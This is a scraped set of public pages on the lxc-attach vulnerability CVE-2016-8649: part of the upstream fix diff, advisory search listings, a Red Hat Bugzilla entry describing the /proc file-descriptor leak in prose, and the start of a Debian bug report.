|  |  | on\_exec = options->attach\_flags & LXC\_ATTACH\_LSM\_EXEC ? 1 : 0; |
|  |  | if (lsm\_set\_label\_at(procfd, on\_exec, init\_ctx->lsm\_label) < 0) { |
|  |  | if (lsm\_set\_label\_at(lsm\_labelfd, on\_exec, init\_ctx->lsm\_label) < 0) { |
|  |  | SYSERROR("Failed to set LSM label."); |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | close(lsm\_labelfd); |
|  |  | rexit(-1); |
|  |  | } |
|  |  | close(lsm\_labelfd); |
|  |  | } |
|  |  |  |
|  |  | if (init\_ctx->container && init\_ctx->container->lxc\_conf && |
|  |  | init\_ctx->container->lxc\_conf->seccomp && |
|  |  | (lxc\_seccomp\_load(init\_ctx->container->lxc\_conf) != 0)) { |
|  |  | ERROR("Loading seccomp policy"); |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | rexit(-1); |
|  |  | } |
|  |  |  |
|  |  | shutdown(ipc\_socket, SHUT\_RDWR); |
|  |  | close(ipc\_socket); |
|  |  | lxc\_proc\_put\_context\_info(init\_ctx); |
|  |  |  |
|  |  | /\* The following is done after the communication socket is |
| Expand Down  Expand Up | | @@ -1245,9 +1332,6 @@ static int attach\_child\_main(void\* data) |
|  |  | SYSERROR("Unable to clear CLOEXEC from fd"); |
|  |  | } |
|  |  |  |
|  |  | /\* we don't need proc anymore \*/ |
|  |  | close(procfd); |
|  |  |  |
|  |  | /\* we're done, so we can now do whatever the user intended us to do \*/ |
|  |  | rexit(payload->exec\_function(payload->exec\_payload)); |
|  |  | } |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `81f466d`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flxc%2Flxc%2Fcommit%2F81f466d05f2a89cb4f122ef7f593ff3f279b165c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8bdb5416_20250126_010320.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%3Fquery%3DCVE-2016-8649)

**GitHub Advisory Database**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%3Fquery%3DCVE-2016-8649)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# GitHub Advisory Database

Security vulnerability database inclusive of CVEs and GitHub originated security advisories from the world of open source software.

## GitHub reviewed advisories

* [All reviewed
  21,144](/advisories?query=CVE-2016-8649+type%3Areviewed)
* [Composer
  4,333](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Acomposer)
* [Erlang
  31](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Aerlang)
* [GitHub Actions
  22](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Aactions)
* [Go
  2,095](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Ago)
* [Maven
  5,265](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Amaven)
* [npm
  3,760](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Anpm)
* [NuGet
  678](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Anuget)
* [pip
  3,446](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Apip)
* [Pub
  12](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Apub)
* [RubyGems
  892](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Arubygems)
* [Rust
  882](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Arust)
* [Swift
  37](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Aswift)

## Unreviewed advisories

* [All unreviewed
  242,536](/advisories?query=CVE-2016-8649+type%3Aunreviewed)

[CC-BY-4.0 License](https://docs.github.com/en/github/site-policy/github-additional-product-terms#12-advisory-database)
[Language support](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database#github-reviewed-advisories)
[About GitHub Advisory Database](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database)

Filter advisories

### Filter advisories

GitHub reviewed advisories
[All reviewed

5,000+](/advisories?query=CVE-2016-8649+type%3Areviewed)
[Composer

4,333](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Acomposer)
[Erlang

31](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Aerlang)
[GitHub Actions

22](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Aactions)
[Go

2,095](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Ago)
[Maven

5,000+](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Amaven)
[npm

3,760](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Anpm)
[NuGet

678](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Anuget)
[pip

3,446](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Apip)
[Pub

12](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Apub)
[RubyGems

892](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Arubygems)
[Rust

882](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Arust)
[Swift

37](/advisories?query=CVE-2016-8649+type%3Areviewed+ecosystem%3Aswift)
Unreviewed advisories
[All unreviewed

5,000+](/advisories?query=CVE-2016-8649+type%3Aunreviewed)

 Search

## 12 advisories

Filter by severity
Filter by CWE
Sort by

Severity

Filter by severity

[All severities](/advisories?query=CVE-2016-8649)
[Low](/advisories?query=CVE-2016-8649+severity%3Alow)
[Moderate](/advisories?query=CVE-2016-8649+severity%3Amoderate)
[High](/advisories?query=CVE-2016-8649+severity%3Ahigh)
[Critical](/advisories?query=CVE-2016-8649+severity%3Acritical)

CWE

 Loading

Sort

Sort by

[Newest](/advisories?query=CVE-2016-8649)
[Oldest](/advisories?query=CVE-2016-8649+sort%3Apublished-asc)
[Recently updated](/advisories?query=CVE-2016-8649+sort%3Aupdated-desc)
[Least recently updated](/advisories?query=CVE-2016-8649+sort%3Aupdated-asc)

[The quotes-collection plugin before 2.0.6 for WordPress has XSS via the wp-admin/admin.php?page...](/advisories/GHSA-xr94-28q3-25f3)
Moderate

Unreviewed

CVE-2016-10952

was published
May 24, 2022

[Microsoft Edge in Microsoft Windows 10 Gold, 1511, 1607, and Windows Server 2016 allows an...](/advisories/GHSA-gx8j-gv5v-crwh)
High

Unreviewed

CVE-2017-8738

was published
May 17, 2022

[Microsoft Edge in Microsoft Windows 10 1511, 1607, 1703, and Windows Server 2016 allows an...](/advisories/GHSA-2f6x-gfvg-4xxv)
High

Unreviewed

CVE-2017-8752

was published
May 17, 2022

[Microsoft Edge in Microsoft Windows 10 Gold, 1511, 1607, 1703, and Windows Server 2016 allows an...](/advisories/GHSA-mx7p-v6cw-2c3r)
High

Unreviewed

CVE-2017-8753

was published
May 17, 2022

[Microsoft Edge in Microsoft Windows 10 Gold, 1511, 1607, 1703, and Windows Server 2016 allows an...](/advisories/GHSA-jjh8-mf4r-2cw2)
High

Unreviewed

CVE-2017-8756

was published
May 17, 2022

[Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 SP2 and R2 SP1, Windows 8.1 and...](/advisories/GHSA-cgcc-2gx3-65mj)
High

Unreviewed

CVE-2017-8741

was published
May 17, 2022

[Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 R2 SP1, Windows 8.1 and Windows...](/advisories/GHSA-cc45-4qw6-jc3c)
High

Unreviewed

CVE-2017-8748

was published
May 17, 2022

[Microsoft Edge in Microsoft Windows 10 1607, 1703, and Windows Server 2016 allows an attacker to...](/advisories/GHSA-7jr2-g9j6-qc7j)
High

Unreviewed

CVE-2017-8649

was published
May 17, 2022

[lxc-attach in LXC before 1.0.9 and 2.x before 2.0.6 allows an attacker inside of an unprivileged...](/advisories/GHSA-vp8j-2cg9-6pvv)
Critical

Unreviewed

CVE-2016-8649

was published
May 14, 2022

[Microsoft Edge in Microsoft Windows 10 1511, 1607, 1703, and Windows Server 2016 allows an...](/advisories/GHSA-3hjj-hrcp-g8r3)
High

Unreviewed

CVE-2017-8755

was published
May 14, 2022

[Microsoft Edge in Microsoft Windows 10 1607, 1703, and Windows Server 2016 allows an attacker to...](/advisories/GHSA-jqwm-5626-476w)
High

Unreviewed

CVE-2017-11764

was published
May 14, 2022

[Microsoft Edge in Microsoft Windows 10 1511, 1607, 1703, and Windows Server 2016 allows an...](/advisories/GHSA-qg93-v358-g553)
High

Unreviewed

CVE-2017-8660

was published
May 13, 2022

**ProTip!**
Advisories are also available from the
[GraphQL API](https://docs.github.com/graphql/reference/queries#securityadvisories)

[CC-BY-4.0 License](https://docs.github.com/en/github/site-policy/github-additional-product-terms#12-advisory-database)
[Language support](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database#github-reviewed-advisories)
[About GitHub Advisory Database](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from marc.info_003de329_20250126_010320.html ===


| Search: [] List [] Subjects [] Authors [] Bodies for list 'oss-security' |
| --- |

Set Page Width:
[ [80](?l=oss-security&s=CVE-2016-8649&w=1) ]
[ [90](?l=oss-security&s=CVE-2016-8649&w=2) ]
[ [100](?l=oss-security&s=CVE-2016-8649&w=3) ]
[ [120](?l=oss-security&s=CVE-2016-8649&w=4) ]

[![Viewing messages in list](images/folderopen.gif) **oss-security**](?l=oss-security&r=1&w=2)
[![- ](images/bookclosed.gif) 2025-01-01 - 2025-02-01 (77 messages)](?l=oss-security&r=1&b=202501&w=2)
```
  1. 2016-11-23  [[oss-security] Security issue in LXC (CVE-2016-8649)](?l=oss-security&m=147992004211070&w=2)  [oss-secur](?l=oss-security&w=2) Tyler Hicks

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from bugzilla.suse.com_52124792_20250126_010300.html ===


| Bugzilla – Search by bug number |
| --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fkeywords%3Did)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

You may find a single bug by entering its bug id here:

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fkeywords%3Did)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from marc.info_59252d4a_20250126_010316.html ===


| Search: [] List [] Subjects [] Authors [] Bodies for list 'full-disclosure' |
| --- |

Set Page Width:
[ [80](?l=full-disclosure&s=CVE-2016-8649&w=1) ]
[ [90](?l=full-disclosure&s=CVE-2016-8649&w=2) ]
[ [100](?l=full-disclosure&s=CVE-2016-8649&w=3) ]
[ [120](?l=full-disclosure&s=CVE-2016-8649&w=4) ]

[![Viewing messages in list](images/folderopen.gif) **full-disclosure**](?l=full-disclosure&r=1&w=2)
[![- ](images/bookclosed.gif) 2025-01-01 - 2025-02-01 (8 messages)](?l=full-disclosure&r=1&b=202501&w=2)

No hits found for 'cve-2016-8649'

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from bugzilla.redhat.com_a6d12b4a_20250126_010318.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3DCVE-2016-8649)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3DCVE-2016-8649)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3DCVE-2016-8649)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1398242

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1398242**](show_bug.cgi?id=1398242)
(CVE-2016-8649)
- [CVE-2016-8649](https://access.redhat.com/security/cve/CVE-2016-8649) lxc: lxc-attach to malicious container allows access to host

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED UPSTREAM | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-8649 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1398243](show_bug.cgi?id=1398243 "CLOSED ERRATA - CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host [fedora-all]") [1398245](show_bug.cgi?id=1398245 "CLOSED ERRATA - CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host [epel-all]") | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=1398242&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1398242&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2016-11-24 10:40 UTC by Andrej Nemec | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-29 14:00 UTC ([History](show_activity.cgi?id=1398242)) | | [CC List:](page.cgi?id=fields.html#cclist) | 4 users (show)  karlthered pokorra.mailinglists sagarun thomas.moschny | | Fixed In Version: |  | | | Doc Type: | If docs needed, set a value | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-06-08 03:02:40 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1398242#c0)  Andrej Nemec    2016-11-24 10:40:15 UTC  ```  [CVE-2016-8649](https://access.redhat.com/security/cve/CVE-2016-8649) was assigned to the issue that allows an attacker inside of an unprivileged container to use an inherited file descriptor, of the host's /proc, to access the rest of the host's filesystem via the openat() family of syscalls. The file descriptor is needed to write to /proc/<PID>/attr/current or /proc/<PID>/attr/exec to set the AppArmor/SELinux label of the attached process.  Upstream bug:  [https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345)  Upstream patch:  <https://github.com/lxc/lxc/commit/81f466d05f2a89cb4f122ef7f593ff3f279b165c>  References:  <http://seclists.org/oss-sec/2016/q4/515>   ```  [Comment 1](show_bug.cgi?id=1398242#c1)  Andrej Nemec    2016-11-24 10:40:56 UTC  ```  Created lxc tracking bugs for this issue:  Affects: fedora-all [[bug 1398243](show_bug.cgi?id=1398243 "CLOSED ERRATA - CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host [fedora-all]")] Affects: epel-all [[bug 1398245](show_bug.cgi?id=1398245 "CLOSED ERRATA - CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host [epel-all]")]   ```  [Comment 2](show_bug.cgi?id=1398242#c2)  Product Security DevOps Team    2019-06-08 03:02:40 UTC  ``` This CVE Bugzilla entry is for community support informational purposes only as it does not affect a package in a commercially supported Red Hat product. Refer to the dependent bugs for status of those individual community products.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1398242&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from bugs.gentoo.org_54a3eb3a_20250126_010313.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Invalid Bug ID

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=CVE-2016-8649&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=CVE-2016-8649&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

'CVE-2016-8649' is not a valid bug number
nor an alias to a bug.

Please press **Back** and try again.

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=CVE-2016-8649&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=CVE-2016-8649&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from bugs.debian.org_75678828_20250124_121220.html ===

# Debian Bug report logs - #845465 lxc: CVE-2016-8649: attach: do not send procfd to attached process

[![version graph](version.cgi?height=2;absolute=0;fixed=lxc%2F1%3A2.0.6-1;fixed=lxc%2F1%3A1.0.6-6%2Bdeb8u5;found=lxc%2F1%3A1.0.6-6%2Bdeb8u4;found=lxc%2F1%3A2.0.5-3;found=lxc%2F1%3A1.0.6-6%2Bdeb8u3;width=2;package=src%3Alxc;collapse=1)](version.cgi?package=src%3Alxc;absolute=0;collapse=1;found=lxc%2F1%3A1.0.6-6%2Bdeb8u4;found=lxc%2F1%3A2.0.5-3;found=lxc%2F1%3A1.0.6-6%2Bdeb8u3;fixed=lxc%2F1%3A2.0.6-1;fixed=lxc%2F1%3A1.0.6-6%2Bdeb8u5;info=1)

Package:
[src:lxc](pkgreport.cgi?src=lxc);
Maintainer for [src:lxc](pkgreport.cgi?src=lxc) is [pkg-lxc <pkg-lxc-devel@lists.alioth.debian.org>](pkgreport.cgi?maint=pkg-lxc-devel%40lists.alioth.debian.org);

Reported by: [Salvatore Bonaccorso <carnil@debian.org>](pkgreport.cgi?submitter=carnil%40debian.org)

Date: Wed, 23 Nov 2016 18:09:01 UTC

Severity: important

Tags: patch, security, upstream

Found in versions lxc/1:1.0.6-6+deb8u4, lxc/1:2.0.5-3, lxc/1:1.0.6-6+deb8u3

Fixed in versions lxc/1:2.0.6-1, lxc/1:1.0.6-6+deb8u5

**Done:** Evgeni Golov <evgeni@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=845465;mbox=yes), [status mbox](bugreport.cgi?bug=845465;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=845465;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, pkg-lxc <pkg-lxc-devel@lists.alioth.debian.org>`:

`Bug#845465`; Package `src:lxc`.
(Wed, 23 Nov 2016 18:09:04 GMT) ([full text](bugreport.cgi?bug=845465;msg=2), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

New Bug report received and forwarded. Copy sent to `carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, pkg-lxc <pkg-lxc-devel@lists.alioth.debian.org>`.
(Wed, 23 Nov 2016 18:09:04 GMT) ([full text](bugreport.cgi?bug=845465;msg=4), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=845465;msg=5), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: lxc: CVE-2016-8649: attach: do not send procfd to attached process
Date: Wed, 23 Nov 2016 19:06:45 +0100
```
Source: lxc
Version: 1:2.0.5-3
Severity: important
Tags: security upstream patch

Hi,

the following vulnerability was published for lxc.

[CVE-2016-8649](https://security-tracker.debian.org/tracker/CVE-2016-8649)[0]:
lxc-attach to malicious container allows access to host

If you fix the vulnerability please also make sure to include the
CVE (Common Vulnerabilities & Exposures) id in your changelog entry.

For further information see:

[0] <https://security-tracker.debian.org/tracker/CVE-2016-8649>
[1] <https://github.com/lxc/lxc/commit/81f466d05f2a89cb4f122ef7f593ff3f279b165c>
[2] <https://launchpad.net/bugs/1639345>
[3] <http://www.openwall.com/lists/oss-security/2016/11/23/6>

